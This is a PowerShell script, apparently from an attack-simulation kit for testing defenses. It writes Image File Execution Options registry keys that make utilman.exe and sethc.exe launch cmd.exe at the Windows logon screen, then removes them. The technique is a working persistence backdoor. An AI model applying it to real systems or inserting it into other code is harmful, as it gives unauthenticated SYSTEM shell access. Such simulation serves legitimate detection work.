<#
    T1546.008 - Event Triggered Execution: Accessibility Features
    T1546.012 - Event Triggered Execution: Image File Execution Options Injection
    T1112 - Event Triggered Execution: Accessibility Features
    T1547 - Boot or Logon Autostart Execution
    Modify registry to get persistence on the system with utilman and sethc
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

$regkey_utilman = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
Write-Host -ForegroundColor Cyan "`n`n#### Persistence technique simulation: Get a cmd shell executing utilman (ergonomic options) at logon screen by changing a registry key"
try{
    if(Test-Path $regkey_utilman){
        Write-Host -ForegroundColor Yellow "Warning: The registry key $regkey_utilman already exist with this value:"
        Get-ItemProperty $regkey_utilman 
    }
    New-Item $regkey_utilman -Force -Verbose
    Set-ItemProperty $regkey_utilman Debugger "C:\windows\system32\cmd.exe" -Verbose
    $result = Get-ItemProperty $regkey_utilman 

    if($result.Debugger -eq "C:\windows\system32\cmd.exe"){
        Write-Host -ForegroundColor Green "Sucess: Registry key `"$regkey_utilman`" Successfully updated"
    }
    else{
        Write-Host -ForegroundColor Red "Failed: $regkey_utilman could not be updated"
    }
}
catch{
    Write-Host -ForegroundColor Red "Error: $_"
}

$regkey_sethc = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
Write-Host -ForegroundColor Cyan "`n`n#### Persitence technique simulation: Get a cmd shell executing sethc.exe instead of the default program that enable keyboard shortcut access to the Windows Command Prompt"
try{
    if(Test-Path $regkey_sethc){
        Write-Host -ForegroundColor Yellow "Warning: The registry key $regkey_sethc already exist with this value:"
        Get-ItemProperty $regkey_sethc 
    }
    New-Item $regkey_sethc -Force -Verbose
    Set-ItemProperty $regkey_sethc Debugger "C:\windows\system32\cmd.exe" -Verbose
    $result = Get-ItemProperty $regkey_sethc 

    if($result.Debugger -eq "C:\windows\system32\cmd.exe"){
        Write-Host -ForegroundColor Green "Sucess: Registry key `"$regkey_sethc`" Successfully updated"
    }
    else{
        Write-Host -ForegroundColor Red "Failed: $regkey_sethc could not be updated"
    }
}
catch{
    Write-Host -ForegroundColor Red "Error: $_"
}

Write-Host -ForegroundColor Cyan "Reverting actions..."
try{
    Remove-Item $regkey_sethc
    Remove-Item $regkey_utilman
    if(Test-Path $regkey_sethc){
        Write-Host -ForegroundColor Yellow "Warning: Persistences techniques with registry key $regkey_sethc is still active on the system" 
    }
    else{
        Write-Host -ForegroundColor Green "Success: Persistences techniques with registry key $regkey_sethc is now removed from the system"
    }
    if(Test-Path $regkey_utilman){
        Write-Host -ForegroundColor Yellow "Warning: Persistences techniques with registry key $regkey_utilman is still active on the system" 
    }
    else{
        Write-Host -ForegroundColor Green "Success: Persistences techniques with registry key $regkey_utilman is now removed from the system"
    }
}
catch{
    Write-Host -ForegroundColor Red "Error: Cannot Remove registry keys created $_"
}

Stop-Transcript
